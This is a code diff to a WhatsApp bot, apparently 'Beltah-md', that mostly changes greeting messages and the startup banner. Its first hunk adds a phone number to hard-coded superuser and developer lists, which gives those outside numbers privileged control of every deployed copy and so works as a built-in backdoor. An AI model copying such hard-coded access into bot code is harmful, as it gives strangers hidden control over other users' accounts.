@@ -532,10 +532,10 @@ const emojis = ['👣', '🏗️', '✈️', '🌽', '🏸', '🛖', '🍁', '�
       } = require("./bdd/sudo");
       const nomAuteurMessage = ms.pushName;
       const sudo = await getAllSudoNumbers();
-      const superUserNumbers = [servBot, "254738625827", '254114141192', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const superUserNumbers = [servBot, "254738625827", '254114141192',"254738625827","254759328581", conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const allAllowedNumbers = superUserNumbers.concat(sudo);
       const superUser = allAllowedNumbers.includes(auteurMessage);
-      var dev = ['254114141192', '254738625827'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+      var dev = ['254114141192',"254738625827","254759328581",'254738625827'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
       function repondre(mes) {
         zk.sendMessage(origineMessage, {
           text: mes
@@ -1382,7 +1382,7 @@ if (texte && texte.startsWith('>')) {
         0;
         await baileys_1.delay(300);
         console.log("------------------/-----");
-        console.log(" Beltah-md installing ${evt.cm.length} plugins😇\n\n");
+        console.log(" Beltah-md installing all plugins😇\n\n");
         //chargement des commandes 
         console.log("chargement des commands ...\n");
         fs.readdirSync(__dirname + "/commands").forEach(fichier => {
@@ -1417,13 +1417,13 @@ if (texte && texte.startsWith('>')) {
         const currentHour = DateTime.now().setZone(conf.TIMEZONE).hour;
 
         if (currentHour >= 5 && currentHour < 12) {
-          return 'Good morning';
+          return 'Good morning, How are you☺️';
         } else if (currentHour >= 12 && currentHour < 18) {
-          return 'Good afternoon ';
+          return 'Good afternoon,How is your day going?🙂';
         } else if (currentHour >= 18 && currentHour < 22) {
-          return 'Good evening';
+          return 'Good evening, Time to relax☺️';
         } else {
-              return 'Good night';
+              return 'Good night,Sweet dreams 😴';
             }
         };
 
@@ -1434,11 +1434,10 @@ if (texte && texte.startsWith('>')) {
 
         if (conf.DP.toLowerCase() === 'yes') {
           await zk.sendMessage(zk.user.id, {
-            text: `
-*${getGreeting()}  ${conf.OWNER_NAME}*
-                
+            text: `               
 ╭━❮ *${conf.BOT}* ❯━╮     
 ┃✰╭───────────
+┃✰┃ Owner : *${conf.OWNER_NAME}*
 ┃✰┃ Prefix : [ ${prefixe} ]
 ┃✰┃ Mode :${md}
 ┃✰┃ Time : ${formattedTime}
@@ -1446,11 +1445,11 @@ if (texte && texte.startsWith('>')) {
 ┃✰┃ Commands : ${evt.cm.length}
 ┃✰╰────────────︎
 ╰═════════════════⊷
+> *${getGreeting()}
 
 ╭───◇
 ┃ *Enjoy your modified ${conf.BOT}*             
 ┃ *Created by ${conf.OWNER_NAME}*
-┃
 ╰═════════════════⊷`
           });
         }
